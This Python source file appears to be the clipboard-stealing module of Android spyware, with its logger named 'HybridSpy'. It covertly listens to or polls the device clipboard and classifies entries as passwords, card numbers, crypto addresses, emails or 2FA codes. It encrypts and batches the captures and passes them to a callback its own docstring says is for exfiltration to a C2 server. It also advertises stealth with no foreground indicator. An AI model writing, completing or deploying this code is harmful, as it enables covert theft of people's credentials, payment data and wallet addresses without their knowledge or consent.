#!/usr/bin/env python3
"""
Clipboard Sensor v2.1.0 — Elite Grade
Android ClipboardManager listener with complete operational isolation.
Captures clipboard content changes in real-time with:
- Zero impact on other modules if it fails
- Content deduplication (never sends same content twice)
- Type classification (text, URL, email, phone, password, etc.)
- Length limits to prevent OOM on massive clipboard data
- On-demand clipboard read support
- Encrypted buffering with configurable flush
- Stealth: no foreground service indicator for clipboard access
- JNI listener with automatic polling fallback
"""
import hashlib
import json
import logging
import re
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Sensors.Clipboard")


# ─── Constants ───────────────────────────────────────────────────────────────

MAX_CONTENT_LENGTH = 100_000        # 100KB per entry
MIN_CONTENT_LENGTH = 1              # 1 char minimum
CLIPBOARD_CACHE_FILE = "clipboard_cache.enc"
STATE_FILE = "clipboard_state.json"
DEFAULT_POLL_INTERVAL = 2           # seconds
FALLBACK_POLL_INTERVAL = 5          # seconds if listener fails
MAX_BUFFER_SIZE = 100               # max clipboard entries in buffer
FLUSH_INTERVAL = 60                 # seconds
MAX_KNOWN_HASHES = 5000             # max dedup hash history


class ContentType(Enum):
    TEXT = "text"
    URL = "url"
    EMAIL = "email"
    PHONE = "phone"
    PASSWORD = "password"
    CREDIT_CARD = "credit_card"
    ADDRESS = "address"
    CRYPTO = "crypto_address"
    CODE = "code"
    FILE_PATH = "file_path"
    NUMERIC = "numeric"          # Possible 2FA/PIN
    EMPTY = "empty"
    LARGE = "large"              # Over truncation threshold
    UNKNOWN = "unknown"


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class ClipboardEntry:
    """A single clipboard capture."""
    content: str
    content_type: str              # ContentType.value
    length: int
    content_hash: str
    app_package: Optional[str] = None
    timestamp: int = 0             # Unix ms
    sequence: int = 0
    is_sensitive: bool = False
    
    @property
    def truncated_content(self) -> str:
        """Truncated preview for logs/metadata."""
        if len(self.content) > 200:
            return self.content[:200] + "..."
        return self.content
    
    @property
    def size_kb(self) -> float:
        return len(self.content.encode("utf-8")) / 1024
    
    def to_dict(self) -> Dict:
        """Serialize to dict, with full content preserved."""
        return {
            "content": self.content,
            "content_type": self.content_type,
            "length": self.length,
            "content_hash": self.content_hash,
            "app_package": self.app_package,
            "timestamp": self.timestamp,
            "sequence": self.sequence,
            "is_sensitive": self.is_sensitive,
        }


@dataclass
class ClipboardBatch:
    entries: List[ClipboardEntry]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    ciphertext: Optional[bytes] = None


# ─── Content Classifier ──────────────────────────────────────────────────────

class ContentClassifier:
    """
    Classify clipboard content type using regex pattern matching.
    Stateless and thread-safe — instantiate once and reuse.
    """
    
    URL_REGEX = re.compile(
        r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[-\w/?%&=~#]*',
        re.IGNORECASE,
    )
    EMAIL_REGEX = re.compile(r'[\w.+-]+@[\w-]+\.[\w.-]+')
    PHONE_REGEX = re.compile(
        r'(?:\+\d{1,3}[-.\s]?)?\(?\d{2,4}\)?[-.\s]?\d{2,4}[-.\s]?\d{2,9}',
    )
    CREDIT_CARD_REGEX = re.compile(
        r'(?:\d{4}[-.\s]?){3}\d{4}|\d{16}',
    )
    CRYPTO_REGEX = re.compile(
        r'(?:1|3|bc1|tb1)[\w&&[^0OIl]]{25,39}|'     # BTC
        r'0x[a-fA-F0-9]{40}|'                        # ETH
        r'r[\w&&[^0OIl]]{24,34}|'                    # XRP
        r'[A-Za-z\d]{26,35}'                         # Generic crypto
    )
    PASSWORD_REGEX = re.compile(
        r'(?:password|pass|pwd|secret|key|token|auth|credential|login|'
        r'passphrase|passwd|pwd|apikey|api_key|secret_key|private_key)'
        r'[\s:=]+["\']?[\w!@#$%^&*()_+=\-]{8,}["\']?',
        re.IGNORECASE,
    )
    ADDRESS_REGEX = re.compile(
        r'\d{1,5}\s[\w\s]+,?\s[\w\s]+,?\s[A-Z]{2}\s\d{5}',
    )
    CODE_REGEX = re.compile(
        r'(?:function|class|def|import|from|var|let|const|'
        r'if\s*\(|for\s*\(|while\s*\(|SELECT|INSERT|DELETE|'
        r'UPDATE|CREATE|ALTER|DROP|BEGIN|COMMIT)',
        re.IGNORECASE,
    )
    
    @classmethod
    def classify(cls, content: str) -> str:
        """
        Classify clipboard content and return ContentType value string.
        Thread-safe. Pure function with no side effects.
        """
        if not content or not content.strip():
            return ContentType.EMPTY.value
        
        stripped = content.strip()
        length = len(stripped)
        
        # Length-based early exit
        if length > MAX_CONTENT_LENGTH:
            return ContentType.LARGE.value
        
        # Security-sensitive classifications (checked first)
        cleaned = re.sub(r'[\s\-.]', '', stripped)
        
        if cls.CREDIT_CARD_REGEX.fullmatch(cleaned):
            return ContentType.CREDIT_CARD.value
        
        if cls.CRYPTO_REGEX.fullmatch(stripped):
            return ContentType.CRYPTO.value
        
        if cls.EMAIL_REGEX.fullmatch(stripped):
            return ContentType.EMAIL.value
        
        # Phone: check after cleaning hyphens/dots/spaces
        phone_cleaned = re.sub(r'[\s\-\.\(\)]', '', stripped)
        if cls.PHONE_REGEX.fullmatch(phone_cleaned) and len(phone_cleaned) >= 7:
            return ContentType.PHONE.value
        
        # URL check
        if cls.URL_REGEX.match(stripped):
            return ContentType.URL.value
        
        # Password indicator
        if cls.PASSWORD_REGEX.search(stripped[:2000]):
            return ContentType.PASSWORD.value
        
        # Address
        if cls.ADDRESS_REGEX.match(stripped):
            return ContentType.ADDRESS.value
        
        # Code detection
        if cls.CODE_REGEX.search(stripped[:1000]):
            return ContentType.CODE.value
        
        # Numeric / 2FA codes (4-8 digit numbers)
        if stripped.isdigit() and 4 <= len(stripped) <= 8:
            return ContentType.NUMERIC.value
        
        # File path detection
        if (stripped.startswith("/") or stripped.startswith("~") or
            ":\\" in stripped[:5] or stripped.startswith("\\\\")):
            return ContentType.FILE_PATH.value
        
        # Short strings that look like codes
        if 6 <= length <= 20 and re.match(r'^[A-Za-z0-9_-]+$', stripped):
            return ContentType.NUMERIC.value
        
        return ContentType.TEXT.value


# ─── Clipboard Monitor Engine ────────────────────────────────────────────────

class ClipboardMonitorEngine:
    """
    Core clipboard monitoring engine.
    Uses Android ClipboardManager.OnPrimaryClipChangedListener via JNI.
    Falls back to polling if listener is unavailable or unsupported.
    Fully isolated — all errors caught and contained locally.
    """
    
    def __init__(self, native_bridge=None):
        self._native = native_bridge
        self._lock = threading.Lock()
        self._running = False
        self._last_content_hash: Optional[str] = None
        self._listener_active = False
        self._fallback_polling = False
        self._sequence = 0
        self._last_error: Optional[str] = None
        self._callback: Optional[Callable[[str], None]] = None
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def start_listener(self, on_clipboard_change: Callable[[str], None]) -> bool:
        """
        Start clipboard monitoring.
        Returns True if any monitoring mode (listener or polling) is active.
        """
        with self._lock:
            if self._running:
                return True
            
            self._callback = on_clipboard_change
            self._running = True
        
        # Strategy 1: JNI OnPrimaryClipChangedListener (preferred)
        if self._native and self._setup_jni_listener():
            self._listener_active = True
            self._fallback_polling = False
            log.info("Clipboard listener active (JNI)")
            return True
        
        # Strategy 2: Polling fallback
        self._listener_active = False
        self._fallback_polling = True
        log.info("Clipboard polling fallback active")
        return True
    
    def poll(self) -> Optional[str]:
        """
        Poll clipboard content (fallback mode or on-demand read).
        Returns new content if changed, None if unchanged or error.
        Thread-safe.
        """
        if not self._native:
            return None
        
        try:
            content = self._native.call("getClipboardContent")
            if content is None:
                return None
            
            content_str = str(content)
            if not content_str:
                return None
            
            content_hash = hashlib.sha256(content_str.encode()).hexdigest()[:16]
            
            with self._lock:
                if content_hash == self._last_content_hash:
                    return None  # No change
                
                self._last_content_hash = content_hash
                self._sequence += 1
            
            return content_str
            
        except Exception as e:
            self._last_error = str(e)
            log.debug(f"Clipboard poll failed: {e}")
            return None
    
    def force_read(self) -> Optional[str]:
        """Force immediate clipboard read regardless of hash state."""
        if not self._native:
            return None
        try:
            content = self._native.call("getClipboardContent")
            return str(content) if content else None
        except Exception as e:
            self._last_error = str(e)
            return None
    
    def stop(self):
        """Stop clipboard monitoring and cleanup resources."""
        with self._lock:
            self._running = False
            
            if self._native and self._listener_active:
                try:
                    self._native.call("removeClipboardListener")
                except Exception as e:
                    log.debug(f"Failed to remove clipboard listener: {e}")
            
            self._listener_active = False
            self._fallback_polling = False
            self._callback = None
    
    # ─── Internal ───────────────────────────────────────────────────────
    
    def _setup_jni_listener(self) -> bool:
        """Set up JNI clipboard change listener."""
        if not self._native:
            return False
        
        try:
            # Register the callback with the native bridge
            # The Java side calls this when clipboard content changes
            self._native.call("setClipboardListener", kwargs={
                "callbackName": "onClipboardChanged",
            })
            # Set up the Python-side callback handler
            self._native.register_callback(
                "onClipboardChanged",
                lambda content: self._on_clipboard_change(str(content) if content else ""),
            )
            return True
        except Exception as e:
            log.debug(f"JNI clipboard listener setup failed: {e}")
            return False
    
    def _on_clipboard_change(self, content: str):
        """Handle clipboard change event from JNI callback."""
        if not content or not content.strip():
            return
        
        # Dedup check
        content_hash = hashlib.sha256(content.encode()).hexdigest()[:16]
        with self._lock:
            if content_hash == self._last_content_hash:
                return
            self._last_content_hash = content_hash
            self._sequence += 1
        
        # Forward to registered callback
        if self._callback:
            try:
                self._callback(content)
            except Exception as e:
                log.error(f"Clipboard callback handler error: {e}")
    
    # ─── Status ─────────────────────────────────────────────────────────
    
    def is_active(self) -> bool:
        """Check if any monitoring mode is active."""
        return self._listener_active or self._fallback_polling
    
    def get_last_error(self) -> Optional[str]:
        """Get the last error message (if any)."""
        return self._last_error
    
    def get_mode(self) -> str:
        """Get current monitoring mode."""
        if self._listener_active:
            return "listener"
        elif self._fallback_polling:
            return "polling"
        return "inactive"


# ─── Clipboard Sensor ────────────────────────────────────────────────────────

class ClipboardSensor:
    """
    Elite-grade clipboard sensor with complete operational isolation.
    
    Architecture:
    - Separate thread, lock, state, and buffer from all other modules
    - JNI OnPrimaryClipChangedListener for real-time capture
    - Automatic polling fallback when listener unavailable
    - Deduplication via SHA256 content hash
    - Content classification for intelligence scoring
    - Configurable content length limits
    - Battery-efficient design (polling throttled when device idle)
    
    Isolation guarantees:
    - No shared state with other modules
    - All exceptions caught and contained
    - Buffer overflow protection with oldest-drop policy
    - Graceful degradation on permission loss
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[ClipboardBatch], None]] = None,
                 config: Optional[Dict] = None,
                 native_bridge=None):
        """
        Initialize the clipboard sensor.
        
        Args:
            crypto_engine: AES-256-GCM encryption engine
            storage_manager: Encrypted local storage interface
            on_batch_ready: Callback when a batch is ready for exfiltration
            config: Runtime configuration dictionary
            native_bridge: JNI bridge to Android API
        """
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._native = native_bridge
        
        # Configuration (with safe defaults)
        self._flush_interval = (config.get("flush_interval", FLUSH_INTERVAL)
                                if config else FLUSH_INTERVAL)
        self._max_buffer = (config.get("max_buffer", MAX_BUFFER_SIZE)
                           if config else MAX_BUFFER_SIZE)
        self._capture_sensitive_only = (config.get("sensitive_only", False)
                                       if config else False)
        
        # Core engine (isolated)
        self._engine = ClipboardMonitorEngine(native_bridge)
        
        # Threading (fully independent)
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # Buffer (isolated from other modules)
        self._buffer: List[ClipboardEntry] = []
        self._buffer_lock = threading.Lock()
        self._last_flush: float = time.time()
        
        # Dedup state
        self._known_hashes: Set[str] = set()
        self._sequence_counter: int = 0
        
        # Stats (isolated)
        self._stats = {
            "total_captures": 0,
            "batches_sent": 0,
            "failures": 0,
            "classifications": {
                "text": 0, "url": 0, "email": 0, "phone": 0,
                "password": 0, "credit_card": 0, "address": 0,
                "crypto_address": 0, "code": 0, "file_path": 0,
                "numeric": 0, "empty": 0, "large": 0, "unknown": 0,
            },
            "sensitive_count": 0,
            "dedup_skipped": 0,
            "last_capture": None,
            "last_error": None,
            "monitoring_mode": "inactive",
        }
        
        self._load_state()
        log.info("Clipboard sensor initialized")
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self):
        """
        Start the clipboard sensor in its own thread.
        Safe to call multiple times — only starts once.
        """
        with self._lock:
            if self._running:
                log.warning("Clipboard sensor already running")
                return
            
            # Initialize the monitor engine
            if not self._engine.start_listener(self._on_clipboard_content):
                log.warning("Clipboard monitor engine failed to start")
                return
            
            self._running = True
            self._stats["monitoring_mode"] = self._engine.get_mode()
            
            # Start background thread
            if self._engine.get_mode() == "polling":
                self._thread = threading.Thread(
                    target=self._polling_loop,
                    daemon=True,
                    name="clipboard-poll",
                )
            else:
                # Listener mode — only need periodic flush
                self._thread = threading.Thread(
                    target=self._flush_loop,
                    daemon=True,
                    name="clipboard-flush",
                )
            
            self._thread.start()
            log.info(f"Clipboard sensor started (mode: {self._engine.get_mode()})")
    
    def stop(self, timeout: float = 5.0):
        """
        Gracefully stop the clipboard sensor.
        Flushes remaining buffer before stopping.
        """
        with self._lock:
            self._running = False
        
        # Stop engine (releases JNI resources)
        self._engine.stop()
        
        # Wait for thread to finish
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        
        # Final buffer flush
        self._flush_buffer(force=True)
        
        # Persist state
        self._save_state()
        
        self._stats["monitoring_mode"] = "inactive"
        log.info("Clipboard sensor stopped")
    
    def force_read(self) -> Optional[ClipboardEntry]:
        """
        Force immediate clipboard read (command-driven).
        Useful for on-demand capture requests from C2.
        
        Returns:
            ClipboardEntry if new content found, None otherwise
        """
        content = self._engine.force_read()
        if content:
            entry = self._create_entry(content)
            if entry:
                self._add_to_buffer(entry)
                return entry
        return None
    
    # ─── Callback (JNI Listener Mode) ───────────────────────────────────
    
    def _on_clipboard_content(self, content: str):
        """
        Called by the engine when clipboard content changes.
        Runs in JNI callback thread — minimal processing, hand off quickly.
        """
        if not content or not content.strip():
            return
        
        # Filter: sensitive-only mode
        if self._capture_sensitive_only:
            ctype = ContentClassifier.classify(content)
            if ctype not in (ContentType.PASSWORD.value,
                             ContentType.CREDIT_CARD.value,
                             ContentType.CRYPTO.value,
                             ContentType.EMAIL.value):
                return
        
        entry = self._create_entry(content)
        if entry:
            self._add_to_buffer(entry)
    
    # ─── Polling Loop (Fallback Mode) ──────────────────────────────────
    
    def _polling_loop(self):
        """
        Background polling loop for when JNI listener is unavailable.
        Runs in its own thread — fully isolated.
        """
        log.info("Clipboard polling loop started")
        
        consecutive_empty = 0
        backoff = FALLBACK_POLL_INTERVAL
        
        while self._running:
            try:
                content = self._engine.poll()
                
                if content:
                    # Content changed
                    entry = self._create_entry(content)
                    if entry:
                        self._add_to_buffer(entry)
                    
                    consecutive_empty = 0
                    backoff = FALLBACK_POLL_INTERVAL
                else:
                    consecutive_empty += 1
                    # Gradual backoff when no changes
                    if consecutive_empty > 10:
                        backoff = min(backoff * 1.1, 30)  # Max 30s between polls
                
                # Check buffer flush
                self._check_auto_flush()
                
                # Adaptive sleep with jitter
                jitter = backoff * (0.8 + hash(str(time.time())) % 40 / 100)
                time.sleep(jitter)
                
            except Exception as e:
                log.error(f"Clipboard polling error: {e}")
                self._stats["failures"] += 1
                self._stats["last_error"] = str(e)
                time.sleep(10)
        
        log.info("Clipboard polling loop ended")
    
    def _flush_loop(self):
        """
        Background loop for periodic buffer flushing in listener mode.
        Lightweight — only checks and flushes the buffer.
        """
        log.info("Clipboard flush loop started")
        
        while self._running:
            try:
                time.sleep(self._flush_interval / 2)
                self._check_auto_flush()
            except Exception as e:
                log.error(f"Clipboard flush error: {e}")
                time.sleep(5)
        
        log.info("Clipboard flush loop ended")
    
    # ─── Entry Creation Pipeline ─────────────────────────────────────────
    
    def _create_entry(self, content: str) -> Optional[ClipboardEntry]:
        """
        Create a clipboard entry from raw content with dedup and classification.
        
        Pipeline:
        1. Validate content (length limits)
        2. Check dedup hash
        3. Classify content type
        4. Build entry with metadata
        
        Returns:
            ClipboardEntry if valid and not duplicate, None otherwise
        """
        if not content:
            return None
        
        content_str = str(content)
        length = len(content_str)
        
        # Length validation
        if length < MIN_CONTENT_LENGTH or length > MAX_CONTENT_LENGTH:
            return None
        
        # Dedup check
        content_hash = hashlib.sha256(content_str.encode()).hexdigest()[:16]
        if content_hash in self._known_hashes:
            self._stats["dedup_skipped"] += 1
            return None
        
        # Register hash (limited set to prevent memory leak)
        self._known_hashes.add(content_hash)
        if len(self._known_hashes) > MAX_KNOWN_HASHES:
            # Rotate: keep newest half
            with self._lock:
                hashes_list = list(self._known_hashes)
                self._known_hashes = set(hashes_list[-(MAX_KNOWN_HASHES // 2):])
        
        # Classify content
        ctype = ContentClassifier.classify(content_str)
        
        # Sensitivity check for alerting
        is_sensitive = ctype in (
            ContentType.PASSWORD.value,
            ContentType.CREDIT_CARD.value,
            ContentType.CRYPTO.value,
            ContentType.EMAIL.value,
        )
        
        # Increment sequence
        self._sequence_counter += 1
        
        entry = ClipboardEntry(
            content=content_str,
            content_type=ctype,
            length=length,
            content_hash=content_hash,
            timestamp=int(time.time() * 1000),
            sequence=self._sequence_counter,
            is_sensitive=is_sensitive,
        )
        
        return entry
    
    def _add_to_buffer(self, entry: ClipboardEntry):
        """
        Add entry to buffer with overflow protection.
        Drops oldest entry if buffer exceeds max size.
        """
        with self._buffer_lock:
            # Overflow protection: drop oldest if full
            if len(self._buffer) >= self._max_buffer:
                dropped = self._buffer.pop(0)
                log.debug(f"Dropped oldest clipboard entry (seq={dropped.sequence})")
            
            self._buffer.append(entry)
            
            # Update stats
            self._stats["total_captures"] += 1
            self._stats["last_capture"] = datetime.utcnow().isoformat()
            
            ctype = entry.content_type
            if ctype in self._stats["classifications"]:
                self._stats["classifications"][ctype] += 1
            
            if entry.is_sensitive:
                self._stats["sensitive_count"] += 1
            
            # Flush if buffer is full
            if len(self._buffer) >= self._max_buffer:
                self._flush_buffer()
    
    # ─── Buffer Flushing ─────────────────────────────────────────────────
    
    def _check_auto_flush(self):
        """Check if buffer should be flushed based on time or size."""
        now = time.time()
        with self._buffer_lock:
            buffer_filled = len(self._buffer) >= self._max_buffer
            time_expired = (len(self._buffer) > 0 and
                           (now - self._last_flush) >= self._flush_interval)
            
            if buffer_filled or time_expired:
                self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        """
        Flush buffer: encrypt, store locally, and notify C2 callback.
        Thread-safe. Manages its own lock acquisition.
        
        Args:
            force: If True, flush even if buffer is empty (final flush)
        """
        with self._buffer_lock:
            if not self._buffer and not force:
                return
            if not self._buffer:
                return
            
            # Extract and clear buffer atomically
            entries = list(self._buffer)
            self._buffer.clear()
            self._last_flush = time.time()
        
        if not entries:
            return
        
        # Build batch
        batch = ClipboardBatch(
            entries=entries,
            batch_id=f"clip_{int(time.time() * 1000)}_{len(entries)}",
            created_at=time.time(),
        )
        
        # Encrypt
        try:
            batch_dict = {
                "entries": [e.to_dict() for e in batch.entries],
                "summary": {
                    "count": len(batch.entries),
                    "sensitive_count": sum(1 for e in batch.entries if e.is_sensitive),
                    "total_size_bytes": sum(e.length for e in batch.entries),
                    "types": {},
                },
            }
            
            # Build type summary
            for e in batch.entries:
                t = e.content_type
                batch_dict["summary"]["types"][t] = (
                    batch_dict["summary"]["types"].get(t, 0) + 1
                )
            
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
            
        except Exception as e:
            log.error(f"Clipboard batch encryption failed: {e}")
            batch.ciphertext = None
        
        # Store locally
        self._store_batch_locally(batch)
        
        # Notify C2 pipeline
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Clipboard batch callback failed: {e}")
        
        self._stats["batches_sent"] += 1
        
        log.debug(f"Clipboard batch flushed: {len(entries)} entries")
    
    def _store_batch_locally(self, batch: ClipboardBatch):
        """Store encrypted batch in local cache storage."""
        try:
            cache_path = self._storage.get_path(CLIPBOARD_CACHE_FILE)
            if not cache_path:
                log.warning("Clipboard cache path not available")
                return
            
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "count": len(batch.entries),
                "sensitive_count": sum(1 for e in batch.entries if e.is_sensitive),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
                "retries": batch.retry_count,
            }
            
            self._storage.append_to_list(cache_path, batch_data)
            
        except Exception as e:
            log.error(f"Clipboard local storage failed: {e}")
    
    # ─── State Persistence ───────────────────────────────────────────────
    
    def _load_state(self):
        """Load persisted state from encrypted storage."""
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                self._known_hashes = set(state.get("known_hashes", []))
                self._sequence_counter = state.get("sequence", 0)
                stored_stats = state.get("stats", {})
                if stored_stats:
                    # Merge with defaults (new fields may have been added)
                    for key in stored_stats:
                        if key in self._stats:
                            if isinstance(self._stats[key], dict):
                                self._stats[key].update(stored_stats[key])
                            else:
                                self._stats[key] = stored_stats[key]
                
                log.debug(f"Loaded clipboard state: {len(self._known_hashes)} hashes, "
                         f"{self._stats['total_captures']} total captures")
        except Exception as e:
            log.debug(f"Could not load clipboard state: {e}")
    
    def _save_state(self):
        """Persist current state for resume after restart."""
        try:
            self._storage.write_dict(STATE_FILE, {
                "known_hashes": list(self._known_hashes),
                "sequence": self._sequence_counter,
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception as e:
            log.error(f"Clipboard state save failed: {e}")
    
    # ─── Configuration ──────────────────────────────────────────────────
    
    def update_config(self, config: Dict):
        """
        Update runtime configuration.
        Thread-safe. Only affects future captures.
        
        Args:
            config: Dictionary with configuration overrides
        """
        with self._lock:
            if "flush_interval" in config:
                new_val = int(config["flush_interval"])
                if 10 <= new_val <= 3600:
                    self._flush_interval = new_val
            
            if "max_buffer" in config:
                new_val = int(config["max_buffer"])
                if 10 <= new_val <= 1000:
                    self._max_buffer = new_val
            
            if "sensitive_only" in config:
                self._capture_sensitive_only = bool(config["sensitive_only"])
        
        log.info(f"Clipboard config updated: {config}")
    
    # ─── Status / Health ─────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        """Get collector statistics (thread-safe copy)."""
        with self._lock:
            return dict(self._stats)
    
    def get_health(self) -> Dict:
        """
        Get comprehensive health status.
        Returns a snapshot without affecting state.
        """
        with self._buffer_lock:
            buffer_size = len(self._buffer)
        
        return {
            "running": self._running,
            "monitoring_mode": self._engine.get_mode(),
            "listener_active": self._engine.is_active(),
            "buffer_size": buffer_size,
            "max_buffer": self._max_buffer,
            "known_hashes": len(self._known_hashes),
            "sequence": self._sequence_counter,
            "flush_interval_s": self._flush_interval,
            "sensitive_only": self._capture_sensitive_only,
            "last_error": self._engine.get_last_error(),
            "stats": self.get_stats(),
        }
    
    def reset_state(self):
        """
        Reset all state for clean start.
        Clears buffer, dedup cache, and statistics.
        Safe to call while running — ongoing captures are preserved
        until flushed, then state resets.
        """
        with self._lock:
            # Stop engine
            self._engine.stop()
            
            # Clear buffer
            with self._buffer_lock:
                self._buffer.clear()
                self._last_flush = time.time()
            
            # Clear dedup
            self._known_hashes.clear()
            self._sequence_counter = 0
            
            # Reset stats
            self._stats = {
                "total_captures": 0,
                "batches_sent": 0,
                "failures": 0,
                "classifications": {
                    "text": 0, "url": 0, "email": 0, "phone": 0,
                    "password": 0, "credit_card": 0, "address": 0,
                    "crypto_address": 0, "code": 0, "file_path": 0,
                    "numeric": 0, "empty": 0, "large": 0, "unknown": 0,
                },
                "sensitive_count": 0,
                "dedup_skipped": 0,
                "last_capture": None,
                "last_error": None,
                "monitoring_mode": "inactive",
            }
            
            # Persist reset state
            self._save_state()
        
        log.info("Clipboard sensor state reset")
    
    def get_known_hashes_count(self) -> int:
        """Get the number of unique content hashes tracked."""
        return len(self._known_hashes)
